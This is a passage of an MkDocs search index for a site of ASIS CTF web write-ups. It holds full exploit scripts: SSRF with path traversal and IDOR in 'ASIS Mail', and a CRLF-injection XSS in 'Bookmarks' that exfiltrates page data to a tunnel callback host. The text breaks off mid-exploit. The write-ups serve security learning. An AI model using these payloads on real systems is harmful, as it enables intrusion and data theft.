{"config":{"lang":["en"],"separator":"[\\s\\-,:!=\\[\\]()\"/]+|(?!\\b)(?=[A-Z][a-z])|\\.(?!\\d)|&[lg]t;","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"CTF Writeups","text":"<p>Welcome to my collection of Capture The Flag (CTF) challenge writeups! This site contains detailed solutions, exploit code, and security lessons learned from various CTF competitions.</p>"},{"location":"#what-youll-find-here","title":"\ud83c\udfaf What You'll Find Here","text":"<p>Each writeup includes:</p> <ul> <li>Detailed vulnerability analysis - Understanding the security flaws</li> <li>Step-by-step exploitation - How to exploit the vulnerabilities</li> <li>Working exploit code - Complete, tested exploit scripts</li> <li>Key takeaways - Security lessons and defensive measures</li> </ul>"},{"location":"#latest-writeups","title":"\ud83d\udcda Latest Writeups","text":""},{"location":"#asis-ctf","title":"ASIS CTF","text":"<p>Four web exploitation challenges featuring advanced techniques:</p> <ul> <li> <p> Sanchess</p> <p>Python expression injection with Unicode normalization bypass</p> <p> Read more</p> </li> <li> <p> Rick Gallery</p> <p>PHP LFI through case-sensitive filter bypass</p> <p> Read more</p> </li> <li> <p> ASIS Mail</p> <p>SSRF + Path Traversal + IDOR vulnerability chain</p> <p> Read more</p> </li> <li> <p> Bookmarks</p> <p>CRLF injection leading to CSP bypass and XSS</p> <p> Read more</p> </li> </ul>"},{"location":"#techniques-covered","title":"\ud83d\udee0\ufe0f Techniques Covered","text":"<p>The writeups on this site cover a wide range of exploitation techniques:</p> Technique Description Challenges SSRF Server-Side Request Forgery ASIS Mail LFI Local File Inclusion Rick Gallery Path Traversal Directory traversal attacks ASIS Mail IDOR Insecure Direct Object Reference ASIS Mail Python Sandbox Escape Breaking out of restricted Python environments Sanchess Unicode Normalization Bypass Filter evasion using Unicode characters Sanchess CRLF Injection HTTP header injection attacks Bookmarks CSP Bypass Content Security Policy evasion Bookmarks XSS Cross-Site Scripting Bookmarks"},{"location":"#learning-resources","title":"\ud83c\udf93 Learning Resources","text":"<p>Each writeup is structured to be educational and includes:</p> <ul> <li>Background on the vulnerability type</li> <li>Common real-world occurrences</li> <li>Detection methods</li> <li>Remediation strategies</li> <li>Links to additional resources</li> </ul>"},{"location":"#contributing","title":"\ud83d\udcec Contributing","text":"<p>Found a mistake or have suggestions? Feel free to open an issue or submit a pull request on GitHub.</p> <p>Happy hacking! Remember: Only perform security testing on systems you own or have explicit permission to test.</p>"},{"location":"about/","title":"About","text":""},{"location":"about/#about-this-site","title":"About This Site","text":"<p>This site is a collection of CTF (Capture The Flag) writeups documenting my journey through various cybersecurity challenges. Each writeup aims to be educational, providing not just solutions but also explanations of the underlying security concepts and techniques.</p>"},{"location":"about/#about-me","title":"About Me","text":"<p>I'm a security enthusiast passionate about:</p> <ul> <li>Web application security</li> <li>Penetration testing</li> <li>Vulnerability research</li> <li>CTF competitions</li> </ul>"},{"location":"about/#why-ctf-writeups","title":"Why CTF Writeups?","text":"<p>Writing detailed writeups serves multiple purposes:</p> <ol> <li>Learning Reinforcement - Writing about a technique helps solidify understanding</li> <li>Knowledge Sharing - Helping others learn from my solutions</li> <li>Documentation - Creating a reference for future challenges</li> <li>Community Contribution - Giving back to the security community</li> </ol>"},{"location":"about/#writeup-philosophy","title":"Writeup Philosophy","text":"<p>My writeups follow these principles:</p> <ul> <li>Detailed but Clear - Enough detail to understand without overwhelming</li> <li>Working Code - All exploit code is tested and functional</li> <li>Educational Focus - Emphasis on learning, not just solving</li> <li>Responsible Disclosure - Only publishing after CTF end dates</li> </ul>"},{"location":"about/#topics-covered","title":"Topics Covered","text":"<p>This site currently features writeups on:</p> <ul> <li>Web Exploitation (SSRF, XSS, CRLF Injection, LFI, Path Traversal)</li> <li>Application Security (CSP Bypass, IDOR, Authentication Bypass)</li> <li>Python Security (Sandbox Escapes, Expression Injection)</li> <li>Filter Evasion (Unicode Normalization, Case Sensitivity)</li> </ul>"},{"location":"about/#adding-new-writeups","title":"Adding New Writeups","text":"<p>This site is built with MkDocs Material and is easy to extend. See the Contributing Guide for details on adding new writeups.</p>"},{"location":"about/#contact-social","title":"Contact &amp; Social","text":"<ul> <li>GitHub: GougasseHamza</li> <li>Issues/Suggestions: GitHub Issues</li> </ul>"},{"location":"about/#disclaimer","title":"Disclaimer","text":"<p>All techniques and exploits documented on this site are for educational purposes only. Always obtain proper authorization before performing any security testing. Unauthorized access to computer systems is illegal.</p> <p>The writeups on this site are based on CTF challenges - controlled, legal environments specifically designed for security research and learning.</p> <p>Last updated: January 2026</p>"},{"location":"asis-ctf/","title":"ASIS CTF","text":"<p>ASIS CTF is a renowned international cybersecurity competition organized by the ASIS (Academy for Skills and Information Security) team. Known for challenging and creative problems, ASIS CTF attracts top security researchers and enthusiasts from around the world.</p>"},{"location":"asis-ctf/#competition-overview","title":"Competition Overview","text":"<p>ASIS CTF features various categories including:</p> <ul> <li>Web Exploitation</li> <li>Cryptography</li> <li>Reverse Engineering</li> <li>Forensics</li> <li>Network Security</li> </ul>"},{"location":"asis-ctf/#challenges-solved","title":"Challenges Solved","text":"<p>Below are the writeups for challenges I solved from ASIS CTF:</p>"},{"location":"asis-ctf/#web-exploitation","title":"Web Exploitation","text":""},{"location":"asis-ctf/#sanchess","title":"Sanchess","text":"<p>Difficulty: Medium-Hard Flag: <code>ASIS{y0u_M2D3_r!cK_@NGRY}</code></p> <p>A Rick and Morty themed chess-like game with a Python expression injection vulnerability. Features two exploitation methods: - Pre-patch: FileLoader class exploitation - Post-patch: Unicode normalization bypass</p> <p>Key Techniques: - Python sandbox escape via class hierarchy - Boolean-based blind data extraction - Unicode fullwidth character filter bypass</p>"},{"location":"asis-ctf/#rick-gallery","title":"Rick Gallery","text":"<p>Difficulty: Easy-Medium Flag: <code>ASIS{...}</code></p> <p>A PHP image gallery application with case-sensitive filtering flaws leading to Local File Inclusion.</p> <p>Key Techniques: - Case-insensitive PHP stream wrapper exploitation - Filter bypass through case manipulation - Systematic file enumeration</p>"},{"location":"asis-ctf/#asis-mail","title":"ASIS Mail","text":"<p>Difficulty: Medium Flag: <code>ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}</code></p> <p>A microservice-based email application with multiple chained vulnerabilities.</p> <p>Key Techniques: - Server-Side Request Forgery (SSRF) - Path traversal in object storage - Insecure Direct Object Reference (IDOR) - Information disclosure through other users' attempts</p>"},{"location":"asis-ctf/#bookmarks","title":"Bookmarks","text":"<p>Difficulty: Hard Flag: <code>FLAG{...}</code></p> <p>A Flask bookmark manager with CRLF injection leading to complete CSP bypass.</p> <p>Key Techniques: - CRLF injection in HTTP headers - HTTP response splitting - Content Security Policy (CSP) bypass - XSS via injected JavaScript - Session cookie exploitation across windows</p>"},{"location":"asis-ctf/#summary-statistics","title":"Summary Statistics","text":"Metric Value Challenges Solved 4 Category Web Exploitation Difficulty Range Easy \u2192 Hard Techniques Covered 10+"},{"location":"asis-ctf/#key-learnings","title":"Key Learnings","text":"<p>The ASIS CTF challenges provided excellent learning opportunities in:</p> <ol> <li>Multi-layered exploitation - Chaining multiple vulnerabilities to achieve the goal</li> <li>Filter bypass techniques - Creative ways to evade input validation</li> <li>Client-side security - Understanding browser security models and their limitations</li> <li>Microservice security - Securing inter-service communication and boundaries</li> </ol> <p>All flags have been redacted where appropriate. These writeups are for educational purposes only.</p>"},{"location":"asis-ctf/asis-mail/","title":"ASIS Mail CTF Challenge Writeup","text":""},{"location":"asis-ctf/asis-mail/#challenge-overview","title":"Challenge Overview","text":"<p>Challenge Name: ASIS Mail Category: Web Target: http://91.107.143.167:8081</p> <p>ASIS Mail is a web-based email service with multiple microservices including an API server, SSO authentication, object storage, and nginx frontend.</p>"},{"location":"asis-ctf/asis-mail/#initial-reconnaissance","title":"Initial Reconnaissance","text":"<p>The challenge provides source code for analysis. The application architecture consists of:</p> <ul> <li>Frontend (nginx): Reverse proxy handling routing</li> <li>API (Go): Main application logic for email composition</li> <li>SSO (Node.js): Authentication service</li> <li>Objectstore (Python/Flask): File storage service</li> <li>PostgreSQL: Database</li> </ul>"},{"location":"asis-ctf/asis-mail/#key-files-structure","title":"Key Files Structure","text":"<pre><code>ASIS_Mail/\n\u251c\u2500\u2500 api/api (Go binary)\n\u251c\u2500\u2500 frontend/nginx.conf\n\u251c\u2500\u2500 objectstore/app.py\n\u251c\u2500\u2500 sso/index.js\n\u251c\u2500\u2500 db/init.sql\n\u2514\u2500\u2500 docker-compose.yml\n</code></pre>"},{"location":"asis-ctf/asis-mail/#vulnerability-analysis","title":"Vulnerability Analysis","text":""},{"location":"asis-ctf/asis-mail/#1-ssrf-in-compose-endpoint","title":"1. SSRF in Compose Endpoint","text":"<p>The API's <code>/compose</code> endpoint accepts XML input with an <code>attachment_url</code> field. When provided, the API fetches content from this URL and stores it as an email attachment.</p> <pre><code>&lt;message&gt;\n    &lt;to&gt;user@asismail.local&lt;/to&gt;\n    &lt;subject&gt;Test&lt;/subject&gt;\n    &lt;body&gt;test&lt;/body&gt;\n    &lt;attachment_url&gt;http://internal-service/path&lt;/attachment_url&gt;\n&lt;/message&gt;\n</code></pre>"},{"location":"asis-ctf/asis-mail/#2-path-traversal-in-objectstore","title":"2. Path Traversal in Objectstore","text":"<p>Examining <code>/home/claude/ASIS_Mail/objectstore/app.py</code>:</p> <pre><code>@app.route(\"/public/&lt;bucket&gt;/&lt;path:object_name&gt;\", methods=[\"GET\"])\ndef public_file(bucket, object_name):\n    if bucket == \"FLAG\":\n        return jsonify({\"error\":\"forbidden\"}), 403\n    file_path = STORAGE / bucket / object_name\n    if not file_path.exists():\n        return jsonify({\"error\":\"not found\"}), 404\n    return send_file(file_path, as_attachment=True)\n</code></pre> <p>The vulnerability: While the code checks if <code>bucket == \"FLAG\"</code>, it doesn't sanitize path traversal in <code>object_name</code>. This means we can use <code>../</code> to escape to the FLAG directory.</p>"},{"location":"asis-ctf/asis-mail/#3-hash-endpoint-without-flag-check","title":"3. Hash Endpoint Without FLAG Check","text":"<pre><code>@app.route(\"/public/&lt;bucket&gt;/&lt;path:object_name&gt;/hash\", methods=[\"GET\"])\ndef public_file_hash(bucket, object_name):\n    file_path = STORAGE / bucket / object_name\n    if not file_path.exists():\n        return jsonify({\"error\":\"not found\"}), 404\n    with open(file_path, \"rb\") as f:\n        flag = f.read()\n    return jsonify({\"status\": \"ok\", \"content\": sha256(flag).hexdigest()}), 200\n</code></pre> <p>Critical: The hash endpoint has NO <code>bucket == \"FLAG\"</code> check! This allows us to verify file existence and get the SHA256 hash of the flag.</p>"},{"location":"asis-ctf/asis-mail/#4-idor-in-email-access","title":"4. IDOR in Email Access","text":"<p>Testing revealed that any authenticated user can read any email by ID:</p> <pre><code>GET /api/mail/1 \u2192 Returns email data regardless of ownership\nGET /api/mail/2 \u2192 Returns email data with attachments from other users\n</code></pre>"},{"location":"asis-ctf/asis-mail/#flag-location","title":"Flag Location","text":"<p>From the Dockerfile: <pre><code>ADD --chmod=444 flag.txt .\nRUN mkdir -p /data/FLAG &amp;&amp; mv flag.txt /data/FLAG/flag-$(md5sum flag.txt | awk '{print $1}').txt\n</code></pre></p> <p>The flag is stored at <code>/data/FLAG/flag-&lt;md5hash&gt;.txt</code> where the hash is the MD5 of the flag content.</p>"},{"location":"asis-ctf/asis-mail/#discovering-the-flag-filename-via-idor","title":"Discovering the Flag Filename via IDOR","text":"<p>The flag filename follows the pattern <code>flag-&lt;md5sum&gt;.txt</code> where the MD5 is computed from the flag content. We don't know the flag content, so we can't compute the hash directly.</p> <p>However, we discovered an IDOR vulnerability in the <code>/api/mail/&lt;id&gt;</code> endpoint - any authenticated user can read ANY email by simply changing the ID number.</p>"},{"location":"asis-ctf/asis-mail/#scanning-other-users-emails","title":"Scanning Other Users' Emails","text":"<pre><code># IDOR - Read any email by ID\nfor email_id in range(1, 800):\n    resp = session.get(f\"{BASE_URL}/api/mail/{email_id}\", headers=headers)\n    if resp.status_code == 200:\n        data = resp.json()\n        attachments = data.get(\"attachments\", [])\n        if attachments:\n            print(f\"Email {email_id}: {data.get('subject')} - {attachments}\")\n</code></pre> <p>Output (excerpt): <pre><code>[Email 2] Subject: a\n    From: test@asismail.local\n    Attachment: secweb.PNG -&gt; /public/1/2603441d-cc34-425d-bbc2-b2f89b086f52\n\n[Email 69] Subject: SSRF attachment\n    From: testuser123@asismail.local\n    Attachment: FLAG -&gt; /public/7/2d163169-4b2e-458d-9f11-60fc1b7faf56\n    *** POTENTIAL FLAG ATTACHMENT! ***\n    Content (404): {\"error\":\"not found\"}\n\n[Email 343] Subject: flag\n    From: flag_1766861609@asismail.local\n    Attachment: flag-0750c96cfc2bd4b665865da15e9d5b94.txt -&gt; /public/114/00c0249d-49a9-419a-ae72-e6e25ccba116\n    *** POTENTIAL FLAG ATTACHMENT! ***\n    Content (404): {\"error\":\"not found\"}\n\n[Email 509] Subject: get-flag\n    From: userpz8udv@asismail.local\n    Attachment: flag-0750c96cfc2bd4b665865da15e9d5b94.txt -&gt; /public/156/c986ad16-6d7a-4cf1-91c7-e5fce82e5f0b\n</code></pre></p>"},{"location":"asis-ctf/asis-mail/#analyzing-other-users-attempts","title":"Analyzing Other Users' Attempts","text":"<p>By examining the emails, we found: - Many users tried SSRF to <code>/FLAG</code> bucket but got \"authorization required\" - Some users discovered the exact filename: <code>flag-0750c96cfc2bd4b665865da15e9d5b94.txt</code> - The attachments returned 404 because files in user buckets are ephemeral</p> <p>The most common flag filename appearing in other users' attempts: <pre><code>grep -o \"flag-[a-f0-9]\\{32\\}\\.txt\" out.txt | sort | uniq -c | sort -rn | head -5\n      7 flag-0750c96cfc2bd4b665865da15e9d5b94.txt\n      3 flag-e528acb4157e8a50e1c2ab2e5b8266b0.txt\n      2 flag-ff1dfe516474072fdb4e0cd05a6aa670.txt\n</code></pre></p> <p>Flag filename discovered: <code>flag-0750c96cfc2bd4b665865da15e9d5b94.txt</code></p>"},{"location":"asis-ctf/asis-mail/#confirming-file-existence-via-hash-endpoint","title":"Confirming File Existence via Hash Endpoint","text":"<p>We verified the file exists using the hash endpoint (which has no FLAG bucket check):</p> <pre><code>GET /files/public/x/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt/hash\n</code></pre> <p>Output: <pre><code>Status: 200\nResponse: {\"content\":\"a69e461b31f79128ebe5b02bd3a5d98f77841f21c65879bdeb5b96ce90b996ff\",\"status\":\"ok\"}\n</code></pre></p> <p>This confirms: - The file exists at <code>/data/FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt</code> - MD5 of flag content: <code>0750c96cfc2bd4b665865da15e9d5b94</code> (from filename) - SHA256 of flag content: <code>a69e461b31f79128ebe5b02bd3a5d98f77841f21c65879bdeb5b96ce90b996ff</code></p>"},{"location":"asis-ctf/asis-mail/#exploitation","title":"Exploitation","text":""},{"location":"asis-ctf/asis-mail/#step-1-register-and-login","title":"Step 1: Register and Login","text":"<pre><code>session = requests.Session()\nusername = f\"exploit_{random_string()}\"\npassword = \"ExploitPass123!\"\n\nsession.post(f\"{BASE_URL}/sso/register\", json={\"username\": username, \"password\": password})\nresp = session.post(f\"{BASE_URL}/sso/login\", json={\"username\": username, \"password\": password})\ndata = resp.json()\ntoken = data.get(\"token\")\nuser_id = data.get(\"user\", {}).get(\"userId\")\n</code></pre> <p>Output: <pre><code>User: exploit_bzodmlyi (ID: 691)\n</code></pre></p>"},{"location":"asis-ctf/asis-mail/#step-2-exploit-path-traversal-via-ssrf","title":"Step 2: Exploit Path Traversal via SSRF","text":"<p>The key insight is using our own user ID as the bucket, then traversing to FLAG:</p> <pre><code>ssrf_url = f\"http://objectstore:8082/public/{user_id}/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt\"\n\nxml = f'''&lt;message&gt;\n    &lt;to&gt;{my_email}&lt;/to&gt;\n    &lt;subject&gt;GetFlag&lt;/subject&gt;\n    &lt;body&gt;test&lt;/body&gt;\n    &lt;attachment_url&gt;{ssrf_url}&lt;/attachment_url&gt;\n&lt;/message&gt;'''\n\nresp = session.post(f\"{BASE_URL}/api/compose\", headers=headers, files={\"xml\": (None, xml)})\n</code></pre> <p>Output: <pre><code>[*] Own bucket traversal\n    URL: http://objectstore:8082/public/691/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt\n    Compose: 200 - {\"ok\":true}\n</code></pre></p>"},{"location":"asis-ctf/asis-mail/#step-3-retrieve-the-flag-from-inbox","title":"Step 3: Retrieve the Flag from Inbox","text":"<pre><code>resp = session.get(f\"{BASE_URL}/api/inbox\", headers=headers)\nemails = resp.json()\n\nfor email in emails:\n    email_resp = session.get(f\"{BASE_URL}/api/mail/{email['id']}\", headers=headers)\n    email_data = email_resp.json()\n\n    for att in email_data.get(\"attachments\", []):\n        att_url = f\"/files{att.get('url')}\"\n        r = session.get(f\"{BASE_URL}{att_url}\")\n        print(r.text)\n</code></pre> <p>Output: <pre><code>[Own bucket traversal]\n    Name: flag-0750c96cfc2bd4b665865da15e9d5b94.txt\n    URL: /public/691/1bfbae05-71ca-46ae-8b34-5e10b62b39b6\n    Content (200): ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}\n</code></pre></p>"},{"location":"asis-ctf/asis-mail/#why-the-exploit-works","title":"Why The Exploit Works","text":"<ol> <li> <p>Bucket Check Bypass: The objectstore checks <code>if bucket == \"FLAG\"</code> but our request uses <code>bucket = \"691\"</code> (our user ID), which passes the check.</p> </li> <li> <p>Path Resolution: The path <code>public/691/../FLAG/flag-xxx.txt</code> resolves to:</p> </li> <li><code>STORAGE / \"691\" / \"../FLAG/flag-xxx.txt\"</code></li> <li> <p>Which becomes <code>/data/FLAG/flag-xxx.txt</code></p> </li> <li> <p>SSRF Stores Content: The API fetches the URL internally (bypassing nginx restrictions) and stores the response as an attachment in our bucket.</p> </li> <li> <p>Public Access: Our bucket (<code>/public/691/</code>) is accessible without authentication, allowing us to retrieve the stored flag.</p> </li> </ol>"},{"location":"asis-ctf/asis-mail/#final-exploit-script","title":"Final Exploit Script","text":"<pre><code>#!/usr/bin/env python3\nimport requests\nimport random\nimport string\nimport time\n\nBASE_URL = \"http://91.107.143.167:8081\"\nFLAG_FILENAME = \"flag-0750c96cfc2bd4b665865da15e9d5b94.txt\"\n\ndef random_string(length=8):\n    return ''.join(random.choices(string.ascii_lowercase, k=length))\n\ndef main():\n    session = requests.Session()\n\n    # Register and login\n    username = f\"exploit_{random_string()}\"\n    password = \"ExploitPass123!\"\n\n    session.post(f\"{BASE_URL}/sso/register\", json={\"username\": username, \"password\": password})\n    resp = session.post(f\"{BASE_URL}/sso/login\", json={\"username\": username, \"password\": password})\n    data = resp.json()\n    token = data.get(\"token\")\n    user_id = data.get(\"user\", {}).get(\"userId\")\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    my_email = f\"{username}@asismail.local\"\n\n    print(f\"User: {username} (ID: {user_id})\")\n\n    # SSRF with path traversal using our own bucket\n    ssrf_url = f\"http://objectstore:8082/public/{user_id}/../FLAG/{FLAG_FILENAME}\"\n\n    xml = f'''&lt;message&gt;\n    &lt;to&gt;{my_email}&lt;/to&gt;\n    &lt;subject&gt;GetFlag&lt;/subject&gt;\n    &lt;body&gt;flag&lt;/body&gt;\n    &lt;attachment_url&gt;{ssrf_url}&lt;/attachment_url&gt;\n&lt;/message&gt;'''\n\n    resp = session.post(f\"{BASE_URL}/api/compose\", headers=headers, files={\"xml\": (None, xml)})\n    print(f\"Compose: {resp.status_code}\")\n\n    time.sleep(1)\n\n    # Retrieve flag from inbox\n    resp = session.get(f\"{BASE_URL}/api/inbox\", headers=headers)\n    for email in resp.json():\n        if email.get(\"subject\") == \"GetFlag\":\n            email_resp = session.get(f\"{BASE_URL}/api/mail/{email['id']}\", headers=headers)\n            email_data = email_resp.json()\n\n            for att in email_data.get(\"attachments\", []):\n                att_url = f\"/files{att.get('url')}\"\n                r = session.get(f\"{BASE_URL}{att_url}\")\n                if \"ASIS{\" in r.text:\n                    print(f\"\\n*** FLAG: {r.text} ***\")\n                    return\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"asis-ctf/asis-mail/#flag","title":"Flag","text":"<pre><code>ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}\n</code></pre>"},{"location":"asis-ctf/asis-mail/#vulnerabilities-summary","title":"Vulnerabilities Summary","text":"Vulnerability Location Impact SSRF API <code>/compose</code> endpoint Access internal services Path Traversal Objectstore <code>/public/&lt;bucket&gt;/&lt;path&gt;</code> Read arbitrary files Missing Auth Check Objectstore <code>/public/.../hash</code> Verify file existence IDOR API <code>/mail/&lt;id&gt;</code> Read any user's emails"},{"location":"asis-ctf/asis-mail/#lessons-learned","title":"Lessons Learned","text":"<ol> <li>Defense in Depth: Multiple checks at different layers would have prevented this attack</li> <li>Path Sanitization: Always sanitize user input that becomes part of file paths</li> <li>Consistent Security Checks: The hash endpoint missing the FLAG check was a critical oversight</li> <li>SSRF Prevention: Whitelist allowed URLs/protocols for server-side requests</li> </ol>"},{"location":"asis-ctf/asis-mail/#tools-used","title":"Tools Used","text":"<ul> <li>Python requests library</li> <li>Manual code review of source files</li> <li>Analysis of other users' attempts via IDOR vulnerability</li> </ul>"},{"location":"asis-ctf/bookmarks/","title":"Bookmarks - CTF Writeup","text":""},{"location":"asis-ctf/bookmarks/#challenge-overview","title":"Challenge Overview","text":"<p>Category: Web Exploitation Techniques: CRLF Injection, HTTP Response Splitting, CSP Bypass, XSS</p>"},{"location":"asis-ctf/bookmarks/#initial-analysis","title":"Initial Analysis","text":"<p>We're given a Flask web application with the following structure:</p> <pre><code>Bookmarks/\n\u251c\u2500\u2500 docker-compose.yaml\n\u251c\u2500\u2500 src-bot/\n\u2502   \u251c\u2500\u2500 bot.py\n\u2502   \u251c\u2500\u2500 Dockerfile\n\u2502   \u2514\u2500\u2500 requirements.txt\n\u2514\u2500\u2500 src-web/\n    \u251c\u2500\u2500 app.py\n    \u251c\u2500\u2500 Dockerfile\n    \u251c\u2500\u2500 requirements.txt\n    \u251c\u2500\u2500 static/\n    \u2502   \u2514\u2500\u2500 style.css\n    \u2514\u2500\u2500 templates/\n        \u251c\u2500\u2500 base.html\n        \u251c\u2500\u2500 dashboard.html\n        \u251c\u2500\u2500 index.html\n        \u251c\u2500\u2500 login.html\n        \u251c\u2500\u2500 register.html\n        \u2514\u2500\u2500 report.html\n</code></pre>"},{"location":"asis-ctf/bookmarks/#source-code-analysis","title":"Source Code Analysis","text":""},{"location":"asis-ctf/bookmarks/#bot-behavior-botpy","title":"Bot Behavior (<code>bot.py</code>)","text":"<pre><code>FLAG = os.getenv(\"FLAG\", \"ctf{REDACTED}\")\n\ndef visit_web(url):\n    with sync_playwright() as p:\n        browser = p.chromium.launch(headless=True)\n        context = browser.new_context()\n        page = context.new_page()\n\n        try:\n            # Visit your URL first\n            page.goto(url)\n            time.sleep(5)\n\n            # Register and log as admin\n            page.goto(BOT_VISIT + '/register')\n            page.fill(\"input[name='username']\", FLAG)  # &lt;-- FLAG is the username!\n            page.fill(\"input[name='password']\", \"password\")\n            page.click(\"input[type='submit']\")\n            time.sleep(1)\n\n            page.goto(BOT_VISIT + '/login')\n            page.fill(\"input[name='username']\", FLAG)\n            page.fill(\"input[name='password']\", \"password\")\n            page.click(\"input[type='submit']\")\n            time.sleep(1)\n\n            # Do some admin stuff\n            time.sleep(5)\n        except Exception as e:\n            print(f\"[BOT] Failed to visit {url}: {e}\")\n</code></pre> <p>Key observations: 1. The bot visits our URL first, then waits 5 seconds 2. The bot registers and logs in with FLAG as the username 3. After login, the bot's session cookie is set</p>"},{"location":"asis-ctf/bookmarks/#web-application-apppy","title":"Web Application (<code>app.py</code>)","text":"<pre><code>@app.after_request\ndef add_csp_header(response):\n    response.headers['Content-Security-Policy'] = \"default-src 'none'; style-src 'self';\"\n    return response\n\n@app.route(\"/dashboard\", methods=['GET'])\ndef dashboard():\n    user_id = session.get(\"user_id\")\n    if not user_id:\n        return \"User not logged\", 400\n\n    username = None\n    with sqlite3.connect(DB_NAME) as conn:\n        cur = conn.execute(\"SELECT username FROM users WHERE id = ?\", (user_id,))\n        user = cur.fetchone()\n        username = user[0] if user else None\n\n    rendered = render_template(\"dashboard.html\", username=username)\n    response = make_response(rendered)\n    response.headers['X-User-' + username] = user_id  # &lt;-- VULNERABILITY!\n\n    return response\n</code></pre> <p>Key observations: 1. Strict CSP: <code>default-src 'none'; style-src 'self';</code> - blocks all scripts! 2. The username is inserted directly into a response header name: <code>X-User-{username}</code> 3. The dashboard template displays: <code>Welcome, {{ username }}!</code></p>"},{"location":"asis-ctf/bookmarks/#vulnerability-crlf-header-injection","title":"Vulnerability: CRLF Header Injection","text":"<p>The vulnerability is in this line: <pre><code>response.headers['X-User-' + username] = user_id\n</code></pre></p> <p>If the username contains CRLF characters (<code>\\r\\n</code>), we can: 1. End the current header 2. Inject new headers 3. End all headers with <code>\\r\\n\\r\\n</code> 4. Inject arbitrary HTML/JavaScript into the response body</p>"},{"location":"asis-ctf/bookmarks/#testing-crlf-injection","title":"Testing CRLF Injection","text":"<pre><code># Payload\nusername = \"test\\r\\n\\r\\n&lt;h1&gt;INJECTED&lt;/h1&gt;&lt;!--\"\n</code></pre> <p>Result: <pre><code>HTTP/1.1 200 OK\nX-User-test\n\n&lt;h1&gt;INJECTED&lt;/h1&gt;&lt;!--: 12345\nContent-Security-Policy: default-src 'none'; style-src 'self';\n...rest of response...\n</code></pre></p> <p>Critical insight: The CSP header ends up in the response body, not as an actual header! This means CSP is not enforced and we can execute JavaScript.</p>"},{"location":"asis-ctf/bookmarks/#exploitation-strategy","title":"Exploitation Strategy","text":""},{"location":"asis-ctf/bookmarks/#the-challenge","title":"The Challenge","text":"<ol> <li>We need to steal the FLAG</li> <li>FLAG appears as the username in \"Welcome, {FLAG}!\" on <code>/dashboard</code></li> <li>Bot logs in as FLAG after visiting our page</li> <li>We need to somehow read the bot's dashboard</li> </ol>"},{"location":"asis-ctf/bookmarks/#failed-approaches","title":"Failed Approaches","text":"<p>Attempt 1: Read <code>window.opener.document</code> - Our page opens a popup, logs in as our CRLF user, navigates to <code>/dashboard</code> - Our injected script tries to read <code>window.opener.document</code> (the bot's main tab) - Result: <code>SecurityError</code> - cross-origin access blocked permanently once opener navigates</p>"},{"location":"asis-ctf/bookmarks/#winning-approach-shared-session-cookies","title":"Winning Approach: Shared Session Cookies","text":"<p>Key insight: The popup window and the main tab share the same cookie jar!</p> <p>After the bot logs in as FLAG: 1. The session cookie is set for <code>http://web</code> domain 2. Our popup is also on <code>http://web</code> domain (via CRLF injection) 3. Our script can <code>fetch(\"/dashboard\")</code> using the bot's session 4. The response contains \"Welcome, FLAG!\"</p>"},{"location":"asis-ctf/bookmarks/#attack-flow","title":"Attack Flow","text":"<pre><code>Timeline:\n0s    - Bot visits our exploit page\n0s    - We open popup, login as CRLF user, navigate to /dashboard\n2s    - Popup loads /dashboard with our injected script (CSP bypassed!)\n5s    - Bot navigates main tab to /register, registers as FLAG\n6s    - Bot navigates to /login, logs in as FLAG (session cookie set!)\n7s    - Bot's session cookie is now active\n8-12s - Our injected script fetches /dashboard \u2192 sees \"Welcome, FLAG!\"\n</code></pre>"},{"location":"asis-ctf/bookmarks/#final-exploit","title":"Final Exploit","text":"<pre><code>#!/usr/bin/env python3\n\"\"\"\nBookmarks CTF - Final Exploit\n\"\"\"\nimport http.server\nimport socketserver\nimport requests\nimport base64\nimport threading\nimport time\nimport random\nimport string\nfrom urllib.parse import urlparse, parse_qs\n\n# ================= CONFIGURATION =================\nTARGET_URL = \"http://65.109.202.184\"\nINTERNAL_ORIGIN = \"http://web\"\nTUNNEL_URL = \"https://your-tunnel-url.trycloudflare.com\"  # Your tunnel\nLOCAL_PORT = 8000\n# =================================================\n\nRANDOM_SUFFIX = ''.join(random.choices(string.ascii_lowercase, k=4))\n\ndef build_malicious_username():\n    # Injected script that fetches /dashboard after bot logs in\n    script = f\"\"\"\nvar T=\"{TUNNEL_URL}\";\nfunction P(m){{new Image().src=T+\"/c?m=\"+encodeURIComponent(m);}}\nP(\"A\");\nfunction go(){{\nP(\"F\");\nfetch(\"/dashboard\").then(function(r){{return r.text();}}).then(function(h){{\nP(\"H\");\nvar m=h.match(/Welcome,([^&lt;]+)/);\nif(m)P(\"W:\"+m[1].trim());\nelse P(\"X:\"+h.substr(0,100));\n}}).catch(function(e){{P(\"E:\"+e);}});\n}}\nsetTimeout(go,8000);\nsetTimeout(go,10000);\nsetTimeout(go,12000);\nP(\"B\");\n\"\"\".replace(\"\\n\", \"\")\n\n    # CRLF payload: end headers, inject script\n    return f\"u{RANDOM_SUFFIX}\\r\\n\\r\\n&lt;script&gt;{script}&lt;/script&gt;&lt;!--\"\n\n\nMALICIOUS_USERNAME = build_malicious_username()\nPASSWORD = \"pwned123\"\n\n\nclass Handler(http.server.SimpleHTTPRequestHandler):\n    def log_message(self, *args):\n        pass\n\n    def do_GET(self):\n        parsed = urlparse(self.path)\n        path = parsed.path\n        qs = parse_qs(parsed.query)\n\n        # Callback endpoint - receives data from injected script\n        if path == \"/c\":\n            msg = qs.get(\"m\", [\"\"])[0]\n            print(f\"[&gt;] {msg}\")\n            self.send_response(200)\n            self.end_headers()\n            return\n\n        # Main exploit page\n        if path in (\"/\", \"/exploit.html\"):\n            b64_user = base64.b64encode(MALICIOUS_USERNAME.encode()).decode()\n\n            html = f\"\"\"&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;script&gt;\nvar T=\"{TUNNEL_URL}\";\nfunction P(m){{new 